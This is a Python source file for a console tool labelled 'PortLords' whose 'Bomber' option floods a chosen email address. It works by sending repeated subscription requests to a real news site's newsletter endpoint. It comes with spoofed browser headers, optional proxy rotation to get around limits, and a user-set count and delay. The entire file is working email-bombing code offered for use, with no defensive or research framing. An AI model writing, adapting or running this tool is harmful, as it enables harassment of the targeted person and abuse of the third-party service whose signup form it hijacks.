import os
import time
import ctypes
import requests
import tkinter as tk
from tkinter import filedialog
from pyfiglet import Figlet
from colorama import init, Fore

# Function to set window size
def set_window():
    os.system("mode con cols=65 lines=20")

# Initializing Colorama
init()
R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
B = Fore.BLUE
P = Fore.MAGENTA
C = Fore.CYAN
X = Fore.RESET

# Function to start the email bombing process
def start_bombing():
    os.system("cls")  # Clearing the console screen
    display_title("Bomber")  # Displaying the title

    # Getting target email address from the user
    user_email = input(f"{P}[{C}+{P}]{X} Target email: ")

    # Asking if the user wants to load proxies
    load_proxies = input(f"{P}[{C}+{P}]{X} Load proxies? (Y/N): ")

    proxies = None

    # If the user chooses to load proxies
    if load_proxies.lower() == "y":
        # Opening a file dialog to select a proxy file
        root = tk.Tk()
        root.withdraw()
        file_path = filedialog.askopenfilename(title="Select a Proxy File", filetypes=[("Text Files", "*.txt")])

        # Reading proxies from the selected file
        with open(file_path, 'r') as file:
            proxy_list = file.read().splitlines()

        # Creating a dictionary of proxies
        proxies = {f'http{index+1}': proxy for index, proxy in enumerate(proxy_list)}

    # Getting the number of emails to send from the user
    email_bomb_count = int(input(f"{P}[{C}+{P}]{X} Number of emails to send: {X}"))

    # Getting the delay between each email from the user
    sleep_time = int(input(f"{P}[{C}+{P}]{X} Delay (seconds): {X}"))

    # URL to send the email bombing requests
    url = "https://artisan.cointelegraph.com/v1/maillist/subscribe/"

    # Headers for the HTTP request
    headers = {
        "Host": "artisan.cointelegraph.com",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0",
        "Accept": "application.json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/json",
        "Origin": "https://cointelegraph.com",
        "Connection": "keep-alive",
        "Referer": "https://cointelegraph.com/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "TE": "trailers"
    }

    successful_bombs = 0  # Counter for successful email bombings

    # Function to set the window title to show the progress of email bombings
    def set_window_title(count):
        ctypes.windll.kernel32.SetConsoleTitleW(f"Successfully Bombed! {count}/{email_bomb_count}")

    os.system("cls")  # Clearing the console screen
    display_title("Bomber")  # Displaying the title

    # Loop for sending email bombing requests
    for i in range(email_bomb_count):
        data = {
            "email": user_email,
            "list": ["63518551307192135", "63518563605939751"]
        }

        # Sending the HTTP POST request with data and headers
        response = requests.post(url, json=data, headers=headers, proxies=proxies)

        # Checking if the request was successful
        if response.status_code == 200 and "success" in response.text.lower():
            successful_bombs += 1
            print(f"{P}[{C}+{P}]{X} Email Bombed {successful_bombs} times!{X}")  # Printing success message
            set_window_title(successful_bombs)  # Updating the window title with progress
        else:
            print(f"{P}[{C}+{P}]{X} {R}{i + 1}{X} Failed attempts!")  # Printing failure message

        time.sleep(sleep_time)  # Adding delay between each email bombing

    # Setting the final window title
    ctypes.windll.kernel32.SetConsoleTitleW("[+] Email Bombing Completed")

    # Printing summary of email bombings
    print(f"{P}[{C}+{P}]{X} Total successful bombings: {C}{successful_bombs}/{email_bomb_count}{X}")
    print(f"{P}[{C}+{P}]{X} Returning to the main menu in {R}5{X} seconds..")
    time.sleep(5)  # Delay before returning to the main menu

# Function to display the title in ASCII art
def display_title(title_text):
    f = Figlet(font='small')
    title = f.renderText(title_text)
    title_lines = title.split('\n')
    max_width = len(title_lines[0])

    # Printing each line of the title centered in the console window
    for line in title_lines:
        print(f"{C}{line.center(max_width)}{X}")

# Function to display the subtitle in ASCII art
def display_subtitle(subtitle_text):
    f = Figlet(font='small')
    subtitle = f.renderText(subtitle_text)
    subtitle_lines = subtitle.split('\n')
    max_width = len(subtitle_lines[0])

    # Printing each line of the subtitle centered in the console window
    for line in subtitle_lines:
        print(f"{P}{line.center(max_width)}{X}")

# Main program loop
while True:
    os.system("cls")  # Clearing the console screen
    print(f"{C} ___         _   _               _    {X}")
    print(f"{C}| _ \___ _ _| |_| |   ___ _ _ __| |___{X}")
    print(f"{C}|  _/ _ \ '_|  _| |__/ _ \ '_/ _` (_-<{X}")
    print(f"{C}|_| \___/_|  \__|____\___/_| \__,_/__/{X}")
    print()
    print(f"{P}[{C}1{P}]{X} Bomber")
    print(f"{P}[{C}2{P}]{X} Exit")
    choice = input("\nEnter your choice: ")

    if choice == "1":
        start_bombing()
    elif choice == "2":
        break
    else:
        print(f"[{R}+{X}] Invalid choice. Please enter a valid option.")
